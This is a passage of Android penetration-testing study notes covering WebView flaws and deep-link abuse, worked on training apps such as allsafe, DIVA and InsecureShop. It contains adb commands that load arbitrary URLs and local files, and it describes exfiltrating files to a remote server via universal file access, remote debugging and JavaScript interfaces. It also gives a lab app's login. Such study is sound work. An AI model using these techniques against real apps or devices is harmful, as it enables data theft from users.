src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2019.png"/></a></figure><ul id="268712df-cf42-4493-a79e-cc9de44d44fa" class="bulleted-list"><li style="list-style-type:disc">Here if we didn’t pass the value of<code> is_reg</code> it will be false by default</li></ul><ul id="242c4400-67b8-4aae-8b73-a2634de36e67" class="bulleted-list"><li style="list-style-type:disc">we will pass the activity by extra string value to the  <code>reg_url</code> variable, to load our URL</li></ul><ul id="d142482f-a664-46fd-85a3-26c84f89a3f5" class="bulleted-list"><li style="list-style-type:disc"><code>loadUrl(…..)</code> is a built-in function in java ⇒ loads the url and it also support the<code> file scheme</code> as long as the APK has the Permission <span style="border-bottom:0.05em solid"><strong>READ_EXTERNAL_STORAGE</strong></span></li></ul><p id="e49f6620-44c2-42f6-808a-471c0f0adcaa" class="">e.g ⇒ so we can use the URL input to view :  <code>file:///etc/hosts</code></p><ul id="7e78e999-906a-43e9-bba0-8936386a32ef" class="bulleted-list"><li style="list-style-type:disc">to export activity with extras, mean that u give additional parameter value in the request <ul id="72cff343-1b2a-4c2d-be39-26f979d98f57" class="bulleted-list"><li style="list-style-type:circle"><code>--es</code> ⇒ String extra</li></ul><ul id="6869d87c-73a1-463e-8193-d35a02e772be" class="bulleted-list"><li style="list-style-type:circle"><code>--ei</code> ⇒ Integer extra</li></ul><ul id="04625dd0-07e3-484c-9b72-6b4a37c1e788" class="bulleted-list"><li style="list-style-type:circle"><code>--ez</code> ⇒ Boolean extra</li></ul></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d6d90b6-03e6-4e5b-9a11-214b92ecf1c4" class="code"><code class="language-Bash">adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url &quot;www.example.com&quot;</code></pre><ul id="0c173132-7c13-4d92-be6f-1897bbb89143" class="bulleted-list"><li style="list-style-type:disc">By this method we can also load Files by the permission of the APP if it has access to some files</li></ul><figure id="b08b8295-eb40-425d-9d0e-6d8b5e0d875e" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2020.png"><img style="width:1008px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2020.png"/></a></figure><hr id="1c3789b6-6ec7-4038-8ee9-e50042ea8969"/><ul id="75388f4a-3b50-4c07-9147-13d104b4a3b4" class="bulleted-list"><li style="list-style-type:disc">Diva example</li></ul><figure id="b06c7e1b-eb66-4191-a605-4719e7bc78de" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2021.png"><img style="width:408px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2021.png"/></a></figure><ul id="9251425b-3739-4663-88cb-d873b87fa4a7" class="bulleted-list"><li style="list-style-type:disc">in AndroidManifest.xml , the activity that has the above intent-filter, will execute the action </li></ul><figure id="0aad4d4c-5979-4e5d-81f8-f7c7cee35f78" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2022.png"><img style="width:637px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2022.png"/></a></figure><ul id="e90588fa-80e9-4202-bc66-1d9c1eb7b33b" class="bulleted-list"><li style="list-style-type:disc">we can also address the <mark class="highlight-yellow_background">activity </mark>itself directly </li></ul><figure id="e20e357d-fd1d-4a8c-9e79-62f135deeb63" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2023.png"><img style="width:446px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2023.png"/></a></figure><figure id="dcc31ee9-987b-45a3-9b67-cfcd77089922" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2024.png"><img style="width:702px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2024.png"/></a></figure><ul id="7736fb8f-c1c4-4190-bdcf-7ba4d9e4795f" class="bulleted-list"><li style="list-style-type:disc">strings.xml contains the string values for variables</li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="356317ce-953c-4d41-aa6e-d99b88fb6a36"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">check_pin ⇒ String value to the chk_pin variable.<br/>Because of this: <br/><code>getString(R.string.chk_pin)<br/><br/></code>in <code>i.putExtra(getString(R.string.chk_pin), chk_pin);</code> <br/>and <br/><mark class="highlight-yellow_background"><em>false </em></mark>is the value of the <mark class="highlight-yellow_background"><em>chk_pin</em></mark></div></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="b7507bc6-356f-4afc-8869-c901c8e6a87d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">if the <code>WebView.setWebContentDebuggingEnabled(true)</code> you can access the App from the LAN and control the screen and execute js </div></figure><ul id="dfd5fbd2-bbcf-4334-8465-7c64cd28706c" class="toggle"><li><details open=""><summary><mark class="highlight-blue">Remote Debugging</mark></summary><p id="96ccaafa-f383-43ff-a648-256ade3675e6" class="">Some times the web view can contain this option </p><figure id="9b9e8bd4-55ce-4fb3-bb83-0d5ed77a3783" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2025.png"><img style="width:1057px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2025.png"/></a></figure><p id="fe408144-bef7-4172-aba1-42c1035db316" class="">This allow the remote debugging, this option can be used if you are on the same network with the victim and he uses app that has web view with this enabled option, then you can control the web view and see what he sees in the app and execute JavaScript code in the context of this web view. This can be done by opening this URL <code>chrome://inspect/#devicecs</code> from chrome and waits for the victim to open the application that has this web view option.</p><figure id="e37d64fd-79ea-4b1c-b71d-19282bb05ba4" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2026.png"><img style="width:847px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2026.png"/></a></figure><p id="c1e22681-723d-457c-84e2-0ea3975bb53b" class="">if you click on <code>inspect</code> in the bottom of the image, you can directly access the web view and also you can then execute <code>js</code> code from the developer tool inside the browser and it will appear on the victim’s screen and also you can execute xhr object to read files from the system and send it to me</p></details></li></ul><hr id="bb74078e-bbba-4962-8789-cc4fe78ec38d"/><figure id="c26715a1-50b6-4df7-876f-9d54cd77dbd8" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2027.png"><img style="width:480px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2027.png"/></a></figure><ul id="e8a2de0f-6f24-4857-8884-5e5a9aadf298" class="bulleted-list"><li style="list-style-type:disc"><code>setAllowUniversalAccessFromFileURLs()</code> bypasses SOP<ul id="250bc46d-dd56-4eec-b556-4c0caaf0ac51" class="bulleted-list"><li style="list-style-type:circle">If you set <code><strong>setAllowUniversalAccessFromFileURLs(true)</strong></code> This setting primarily affects JavaScript&#x27;s ability to access content from local files within the WebView. While it can be used to relax the Same-Origin Policy for file URLs</li></ul></li></ul><ul id="e4bd0164-9f9f-4375-a97f-4f36eb6180be" class="bulleted-list"><li style="list-style-type:disc"><code>SetJavaScriptEnabled()</code> supports you to execute <code>js</code> in web view context.<ul id="ed5e2511-ddeb-4e28-915e-72b22b97ebf4" class="bulleted-list"><li style="list-style-type:circle"> <code><code><code><strong>setAllowUniversalAccessFromFileURLs(true)</strong></code></code></code><strong> here allow </strong><code>js</code> <mark class="highlight-blue_background">execution from your local files</mark> using <mark class="highlight-blue_background">file schema </mark>URLs and this <mark class="highlight-blue_background">removes any restrictions to same origin policy and permit the web view to send web requests from local file in the system</mark>. if it’s true we can use it to make  JS file that sends sensitive data to a remote attacker server with web requests.</li></ul></li></ul><ul id="bf76306d-c77d-49bd-8ae4-e22bc8bf107b" class="bulleted-list"><li style="list-style-type:disc">ex.</li></ul><figure id="f81ae668-dcd0-4aa1-9f1f-1334ac9887bd" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2028.png"><img style="width:912px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2028.png"/></a></figure><p id="4df7d9ee-d38e-478f-9e51-da145bc6dc8a" class=""><a href="https://beeceptor.com/">https://beeceptor.com/</a> ⇒ allow you to make Endpoint to forward your request and see its body</p><figure id="01e8d80c-cf3c-4011-b9d3-aae0209f6e70" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2029.png"><img style="width:960px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2029.png"/></a></figure><hr id="a3a555f3-fa34-43a2-85f5-72529f2750c5"/><figure id="5f091f63-a1c1-4607-9b8c-36ab98f6c368" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2030.png"><img style="width:688px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2030.png"/></a></figure><ul id="c3c9385c-ad73-4a44-899d-adb41239ef0a" class="bulleted-list"><li style="list-style-type:disc">Web views in android allows you to use JavaScript and can be enabled through this line.</li></ul><ul id="c322ff96-14fa-45fb-9bdb-d1ed5643c341" class="bulleted-list"><li style="list-style-type:disc">This line makes an interface between JavaScript used in web view and java source code used inside the app. </li></ul><ul id="308a35ed-5c1d-446b-aaa5-9ab46d65c5b2" class="bulleted-list"><li style="list-style-type:disc">So, JavaScript can call any public method defined from <code>WebAppInterface()</code> objects or in this class actually.</li></ul><p id="b8682007-8e27-4953-98f1-ec41f9f16661" class=""><strong>This interface takes 2 parameters</strong></p><p id="ea183d0e-d979-4c52-9e5c-aaef3d720a9a" class="">1- the exposed interface <code>WebAppInterface()</code> </p><p id="8f78fc88-5863-4b96-97ff-bafc038b3695" class="">2- the reference that will be called from the JavaScript code. in our example <code>&quot;Android&quot;</code></p><p id="2d655147-e7a6-4fd0-a881-8fe1fa165965" class="">This can be used to invoke native utilities from your phone like sending SMS to anyone or stealing your account information. Here is an <code>js</code> example of calling function inside this class :</p><figure id="76a9e5ea-8ecd-4c1b-bdc6-a0068138334e" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2031.png"><img style="width:384px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2031.png"/></a></figure></div></details><ul id="9e4f8920-4bff-4b70-9642-6a2c9ff42ae4" class="toggle"><li><details open=""><summary><mark class="highlight-blue"><strong>Old school attacks</strong></mark></summary><p id="e4a1d009-03ed-43b5-ba82-dee1477f63ae" class="">In the past from android 4, if you can render the java code from web view then you can control the whole app and get to RCE from it. For example : </p><figure id="866f9360-e255-453b-8cee-3f5f44be4195" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2032.png"><img style="width:1554px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2032.png"/></a></figure><p id="52b35ad9-9497-43cb-956c-86a99816f92b" class="">the purpose of this code is to use<mark class="highlight-yellow"> java reflection</mark> (which allow you to return to the base class) and get instance from <mark class="highlight-yellow">Runtime</mark> object where you can <mark class="highlight-yellow">execute system commands</mark> from java. All of this things can be done when you can access the java code.</p><p id="b617c2f5-5ff9-40c4-8a97-22e334604f98" class="">This was used to write ARM binary and drop it in the system then execute it, this can steal things from <code>sdcard</code> for example like photos, videos and so on. Also if the app don’t have the storage permission so the attacker can not read from <code>sdcard</code> , he still can use ginger break vulnerability or ds noter from which he can get root on the system.</p><p id="10cc2ed8-31fc-4701-aca6-f6959d9f0643" class=""><strong><mark class="highlight-yellow">NOW , the android apps have protection from all reflection based attacks</mark></strong>. by using this option :</p><figure id="f5a52a57-1134-43eb-9063-2ece597c50f2" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2033.png"><img style="width:660px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2033.png"/></a></figure><p id="c9bc9f15-679b-4dfb-aa4e-766d752c8973" class="">This option permits checking to the loaded URL and make validations on it to stop the injection attacks.</p><p id="4b168bd8-e5ea-4520-aa10-b848fa43d65c" class="">
</p></details></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Deep links</summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>What is a </strong><mark class="highlight-pink"><strong>IMPLICIT </strong></mark><strong>Deep Link?</strong><mark class="highlight-orange"><strong> URL points to an activity</strong></mark></summary><div class="indented"><p id="dcdde72b-b28b-4fd3-91e1-6dab7ecafd89" class="">is detected in Manifest <code>&lt;data android:scheme=&quot;EXAMPLE&quot; .... &gt;</code></p><figure id="bde24da1-f851-4f1f-bbeb-0d9577239d08" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2034.png"><img style="width:1198px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2034.png"/></a></figure><p id="ba3a5abb-1d0b-4003-80d4-ef3daf880a99" class="">Deeplink here⇒ <code>allsafe://infosecadventures/congrats</code></p><figure id="1432cefc-1668-4574-9355-8b6043702ed5" class="image"><a href="https://miro.medium.com/v2/resize:fit:609/1*Vild0eHXaRyVL97V39wH2w.png"><img style="width:609px" src="https://miro.medium.com/v2/resize:fit:609/1*Vild0eHXaRyVL97V39wH2w.png"/></a></figure><p id="18d4cf0e-da98-4804-ba76-c7bbd536f250" class="">Deep link in Android Manifest.xml</p><p id="4c25bf19-f1cd-47b4-bb73-d318d2a40e84" class="">In the above image, we can see the deep link for an activity.</p><ol type="1" id="e57294d4-dc9e-4996-bce1-514f55552a7d" class="numbered-list" start="1"><li>The URIs <code>“example://gizmos”</code> and <code>“http://www.example.com/gizmos”</code> both resolve to the activity named<code><strong>”com.example.android.GizmosActivity”</strong></code>.</li></ol><ol type="1" id="98a2014a-73ec-430f-9217-a20475ad2424" class="numbered-list" start="2"><li><strong>Intent-filter </strong>defines the capability of a activity component based on the type of URI.</li></ol><ol type="1" id="b5039496-b4cf-4520-be7f-17891797f9d4" class="numbered-list" start="3"><li><code>&lt;action&gt;</code> Specify the <code>ACTION_VIEW</code> intent action, so that the intent filter can be reached from Google, DuckDuckGo or Any other Search Engine.</li></ol><ol type="1" id="d95e835b-7db0-44a5-b778-ef1ba9b48c99" class="numbered-list" start="4"><li><code>&lt;category&gt;</code> Include the <code>BROWSABLE</code> category. It is required in order for the intent filter to be accessible from a web browser. Without it, clicking a link in a browser cannot resolve to your app.</li></ol><p id="7ef4d66b-1e02-4712-8edd-3f762cff9e2e" class="">Also include the <code>DEFAULT</code> category. This allows your app to respond to implicit intents. Without this, the activity can be started only if the intent specifies your app component name.</p><p id="9647d3ff-fe93-4f7f-9580-7542e4e0289f" class="">5. Add one or more <a href="https://developer.android.com/guide/topics/manifest/data-element"><code>&lt;data&gt;</code></a> tags, each of which represents a URI format that resolves to the activity. At minimum, the  tag must include the <a href="https://developer.android.com/guide/topics/manifest/data-element#scheme"><code>android:scheme</code></a> attribute.</p><p id="9e32e100-0ae3-43b9-822d-e394371e1ae2" class="">You can add more attributes to further refine the type of URI that the activity accepts. For example, you might have multiple activities that accept similar URIs, but which differ simply based on the path name. In this case, use the <a href="https://developer.android.com/guide/topics/manifest/data-element#path"><code>android:path</code></a> attribute or its <code>pathPattern</code> or <code>pathPrefix</code> variants to differentiate which activity the system should open for different URI paths.</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>Types of Deep links in Android</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>Explicit Deep Link</strong></summary><div class="indented"><ul id="a965aa6b-10ba-49dd-8207-f7a690fbd8fe" class="bulleted-list"><li style="list-style-type:disc">An <mark class="highlight-pink"><strong>explicit</strong></mark><mark class="highlight-pink"> deep link </mark>is a<mark class="highlight-pink"> single instance of a deep link</mark> that uses a <code>PendingIntent</code> to take users to a <mark class="highlight-pink">specific location</mark><em><span style="border-bottom:0.05em solid"><strong><mark class="highlight-pink"> within your app</mark></strong></span></em>.</li></ul><ul id="37ae9f35-6d12-42c6-aae5-d37f7c7793e7" class="bulleted-list"><li style="list-style-type:disc"> is typically associated with a specific <mark class="highlight-teal_background">URI (Uniform Resource Identifier) </mark>that directly maps to a particular activity or content within the app.<em><span style="border-bottom:0.05em solid"><strong><mark class="highlight-teal_background"> It&#x27;s explicit because the URI directly specifies what content or activity should be opened when the link is triggered</mark></strong></span></em>.</li></ul><p id="11608c6a-2791-4e0a-a935-9288f02db6e9" class=""><strong><mark class="highlight-pink">Ex: A notification or An app widget</mark></strong></p><figure id="4fffd49b-b8bc-44e1-90aa-1d3ba38b09ef" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2035.png"><img style="width:288px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2035.png"/></a></figure><figure id="25f6d20c-3c5d-4ab2-a1e1-73bd01818982" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2036.png"><img style="width:144px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2036.png"/></a></figure></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>Implicit Deep Link</strong></summary><div class="indented"><p id="c77afa4f-3824-4663-82df-887a3111ab7a" class="">found in Manifest under <code>&lt;data&gt;</code> tags </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="85e5bc22-6f9f-47cf-9ef6-6a6300fd4cfa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">An Implicit deep link is a deep link in the form of URL when clicked, takes you to the content directly within the respected application.</code></pre><ul id="7abb6184-0bda-4dfb-84a0-296b106a6f74" class="bulleted-list"><li style="list-style-type:disc">An implicit deep link is often associated with deep linking based on URL patterns or content metadata. In this case, the app is configured to handle URLs that match a certain pattern, and the system automatically opens the relevant activity or content based on the URL structure. Implicit deep linking allows for a more flexible approach where various URLs can lead to different parts of the app without explicitly specifying each one in advance.</li></ul><p id="ae2d07a2-9a9f-43e7-900f-60a5b1d1fdac" class="">Ex: when a user clicks a link, Android can then open your app to the corresponding destination (<a href="https://play.app.goo.gl/?link=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.twitter.android&amp;ddl=1&amp;pcampaignid=web_ddl_1">Play store link</a>).</p><figure id="ec2a643a-e419-433f-b402-75d2bdd5a9b1" class="image"><a href="https://miro.medium.com/v2/resize:fit:605/1*4O_EYiga1DxW9xIy5dVURw.png"><img style="width:605px" src="https://miro.medium.com/v2/resize:fit:605/1*4O_EYiga1DxW9xIy5dVURw.png"/></a></figure><p id="a567f738-3b20-438d-a52b-b425f8b8d34a" class=""><strong><mark class="highlight-pink">Implicit Deep Link: URL redirected to target application</mark></strong></p></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>Demo Time</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">allsafe</summary><div class="indented"><figure id="bff5109c-d7ac-4240-9736-5ef499691678" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2037.png"><img style="width:1300px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2037.png"/></a></figure><ol type="1" id="04be737e-658e-484f-8c40-be2e2e5cc17e" class="numbered-list" start="1"><li>we can call this deeplink activity using ⇒ <code>allsafe://infosecadventures/congrats</code></li></ol><ol type="1" id="03cfe7a0-2c8a-4090-a13c-e33b4c1546b1" class="numbered-list" start="2"><li>Now head to <code>onCreate</code> function to check if there’re extras to be handeled as URL parameter</li></ol><figure id="a0a646db-727a-45e3-b3f4-c488ebd434dd" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2038.png"><img style="width:576px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2038.png"/></a></figure><p id="b1238b4b-249e-4aaa-b2c5-b6cf19615faa" class="">so we need to specify the value of key stored in Strings.xml to our link </p><figure id="d471ba5a-7348-4f70-8769-a4862495f473" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2039.png"><img style="width:1144px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2039.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9f35608e-1c3c-4e0a-bdea-1f87b665897d" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">adb -d shell am start -a android.intent.action.VIEW -d &quot;allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c&quot;</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Insecure Shop</summary><div class="indented"><ol type="1" id="4371c634-d48d-432a-a072-feb59971f0aa" class="numbered-list" start="1"><li><code>&lt;data&gt;</code> tags to collect the URL</li></ol><p id="a0de1f87-c6f8-4e1c-a512-8da3f9f16478" class="">DeepLink ⇒ <code>insecureshop://com.insecureshop</code></p><figure id="376a2dad-c414-4603-af8f-9cc2a8575cc8" class="image" style="text-align:center"><a href="https://miro.medium.com/v2/resize:fit:700/1*0fJ4iRILdRhiiIchReEZ6Q.png"><img style="width:480px" src="https://miro.medium.com/v2/resize:fit:700/1*0fJ4iRILdRhiiIchReEZ6Q.png"/></a></figure><ol type="1" id="17a0064b-91c7-44f6-9989-52073c6ae697" class="numbered-list" start="2"><li>head to <code>onCreate</code></li></ol><figure id="edbcec19-673e-4f80-9396-fdb3a3c1d610" class="image" style="text-align:center"><a href="https://miro.medium.com/v2/resize:fit:700/1*u4Pp9qmRWmKDXgYx12-uDg.png"><img style="width:432px" src="https://miro.medium.com/v2/resize:fit:700/1*u4Pp9qmRWmKDXgYx12-uDg.png"/></a></figure><p id="6ffa9a43-56a2-42d6-8afa-1db00520930e" class="">webview source code 1</p><ol type="1" id="775cdc4c-2371-49ea-8ee7-78aa28eb160b" class="numbered-list" start="1"><li><code>onCreate()</code> is a life cycle event in Android. There are 6 core set of life cycle events in Android’s activity lifecycle <a href="https://developer.android.com/reference/android/app/Activity#onCreate(android.os.Bundle)"><code>onCreate()</code></a>, <a href="https://developer.android.com/reference/android/app/Activity#onStart()"><code>onStart()</code></a>, <a href="https://developer.android.com/reference/android/app/Activity#onResume()"><code>onResume()</code></a>, <a href="https://developer.android.com/reference/android/app/Activity#onPause()"><code>onPause()</code></a>, <a href="https://developer.android.com/reference/android/app/Activity#onStop()"><code>onStop()</code></a>, and <a href="https://developer.android.com/reference/android/app/Activity#onDestroy()"><code>onDestroy()</code></a> which are self-explanatory.</li></ol><ol type="1" id="660b6833-b471-4cdb-a3a9-e45e39e6d750" class="numbered-list" start="2"><li><code>webview</code> settings for the defined webview activity. ⇒ <mark class="highlight-pink">WebViews are effectively </mark><mark class="highlight-pink"><strong>web browsers</strong></mark><mark class="highlight-pink"> embedded into Android Apps.</mark></li></ol><ol type="1" id="dfe9a414-a308-41b3-8a90-496f3acfb779" class="numbered-list" start="3"><li><code>getIntent()</code> fetches the intent and stores in <code>intent object</code>.</li></ol><ol type="1" id="ac0bd63c-30be-48b4-8df4-eb3c05aa5abb" class="numbered-list" start="4"><li><code>intent.getData()</code> fetches the uri and stores in <code>uri object</code> and checks if uri is empty.</li></ol><figure id="55c06179-2250-4f05-bccb-504ef1343eaf" class="image" style="text-align:center"><a href="https://miro.medium.com/v2/resize:fit:700/1*HKG-ywjbY5KuKzmeMunMAw.png"><img style="width:528px" src="https://miro.medium.com/v2/resize:fit:700/1*HKG-ywjbY5KuKzmeMunMAw.png"/></a></figure><p id="b316947b-844c-4c31-800e-94897d9c473f" class="">webview source code 2</p><figure id="37c1f857-0889-428a-b65f-4dcaa84786c4" class="image" style="text-align:center"><a href="https://miro.medium.com/v2/resize:fit:497/1*eT515ww2ILOziNwUAdwGcg.png"><img style="width:497px" src="https://miro.medium.com/v2/resize:fit:497/1*eT515ww2ILOziNwUAdwGcg.png"/></a></figure><p id="2ca54a00-aa1e-4a64-8b65-06626c3e0276" class="">uri format</p><ol type="1" id="a58cb7e8-768d-4b48-aba9-cccf0c401743" class="numbered-list" start="1"><li>checks for path if it has <code>/web</code> in it and execute the respective code.</li></ol><ol type="1" id="bf712906-2423-49b1-9220-863eb8f1a15c" class="numbered-list" start="2"><li>checks for path if it has <code>/webview</code> in it and execute the respective code.</li></ol><ol type="1" id="c8ee6cd9-2b45-4e28-b103-83bb20649b41" class="numbered-list" start="3"><li>finish the checks, if both check fails and webview will not be loaded.</li></ol><p id="fc6aa9ad-0b77-4ee7-b289-8556c429f7b9" class="">if 1 or 2 passes, it will fetch the uri and extract the value from the <code>url</code> query and store it on <code>data</code> variable and will be loaded via webview.</p><p id="6dc9dcef-f680-48eb-84b5-babc75b43960" class="">From the above image, we will try to complete the uri to load the arbitrary web page in the webview.</p><p id="24ed52f1-a7f6-42ac-a8b2-ca011aeec10b" class=""><code><strong>insecureshop://com.insecureshop/web?url=https://3kal.medium.com</strong></code><strong> (or)</strong></p><p id="1c04998f-380c-4d71-aedc-1bab9a892bdb" class=""><code><strong>insecureshop://com.insecureshop/webview?url=https://3kal.medium.com</strong></code></p><p id="d6b0dc5f-f65d-498a-b3b0-45511e0ed2b4" class="">we will use <code>ADB</code> to initiate the webview with our uri and we need to be logged into the <code>insecureshop</code> application.</p><p id="ba01065a-9fd1-4dab-acda-8f5f2554c6ee" class="">if you are not able to find the credentials, then here it is <code><strong>shopuser:!ns3csh0p</strong></code><strong> , </strong>once we login the screen looks like below.</p><figure id="dc0de512-9a7e-4aaf-bef5-5c61f1e6b880" class="image"><a href="https://miro.medium.com/v2/resize:fit:489/1*B7LPLD8uQnNOUdWpIxt8dg.png"><img style="width:288px" src="https://miro.medium.com/v2/resize:fit:489/1*B7LPLD8uQnNOUdWpIxt8dg.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" 